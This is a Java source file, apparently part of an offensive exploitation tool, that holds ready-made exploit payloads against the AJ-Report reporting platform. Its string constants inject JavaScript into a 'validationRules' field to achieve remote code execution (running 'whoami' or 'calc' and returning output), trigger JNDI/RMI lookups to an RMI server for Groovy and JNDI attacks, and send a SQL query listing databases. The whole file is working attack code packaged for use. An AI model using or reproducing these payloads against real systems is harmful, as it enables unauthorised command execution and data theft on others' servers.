package com.liev.clouds.payload;

/**
 * @author Revcloud
 * @since 2024/7/26 17:20
 */
public class AjReportPayload {
    public final static String GORRVY_EXP = "{\"sampleItem\":\"1\",\"validationRules\":\"function verification(data){initialContext=new javax.naming.InitialContext();initialContext.lookup(\\\"rmi://127.0.0.1:1099/Groovy\\\");}\"}";

    public final static String JNDI_EXP = "{\"sampleItem\":\"1\",\"validationRules\":\"function verification(data){initialContext=new javax.naming.InitialContext();initialContext.lookup(\\\"rmi://127.0.0.1:1099/Jndi\\\");}\"}";

    public final static String RCE_EXP = "{\"sampleItem\":\"1\",\"validationRules\":\"function verification(data){var se= new javax.script.ScriptEngineManager();var r = se.getEngineByExtension(\\\"js\\\").eval(\\\"new java.lang.ProcessBuilder('whoami').start().getInputStream();\\\");result=new java.io.BufferedReader(new java.io.InputStreamReader(r));ss='';while((line = result.readLine()) != null){ss+=line};return ss;}\"}";

    public final static String JS_EXP = "{\n" +
            "    \"dataSetParamDtoList\": [\n" +
            "        {\n" +
            "            \"paramType\": \"\",\n" +
            "            \"paramDesc\": \"\",\n" +
            "            \"validationRules\": \"function verification(data){var se= new javax.script.ScriptEngineManager();var r = se.getEngineByExtension(\\\"js\\\").eval(\\\"new java.lang.ProcessBuilder('calc').start().getInputStream();\\\");result=new java.io.BufferedReader(new java.io.InputStreamReader(r));ss='';while((line = result.readLine()) != null){ss+=line};return ss;}\",\n" +
            "            \"paramName\": \"\",\n" +
            "            \"mandatory\": true,\n" +
            "            \"sampleItem\": \"\",\n" +
            "            \"requiredFlag\": 2\n" +
            "        }\n" +
            "    ],\n" +
            "    \"dataSetTransformDtoList\": [\n" +
            "        {\n" +
            "            \"transformScript\": \"function dataTransform(){}\",\n" +
            "            \"transformType\": \"js\"\n" +
            "        }\n" +
            "    ],\n" +
            "    \"setType\": \"http\",\n" +
            "    \"dynSentence\": \"{\\\"apiUrl\\\":\\\"http://127.0.0.1:9095/dataSet/testTransform\\\",\\\"method\\\":\\\"GET\\\",\\\"header\\\":\\\"{\\\\\\\"Content-Type\\\\\\\":\\\\\\\"application/json;charset=UTF-8\\\\\\\"}\\\",\\\"body\\\":\\\"\\\"}\"\n" +
            "}";
    public final static String SQL_EXP = "{\"sourceCode\":\"utf_8\",\"dynSentence\":\"show DATABASES\",\"dataSetParamDtoList\":[\n],\"dataSetTransformDtoList\":[],\"setType\":\"sql\"}";
}
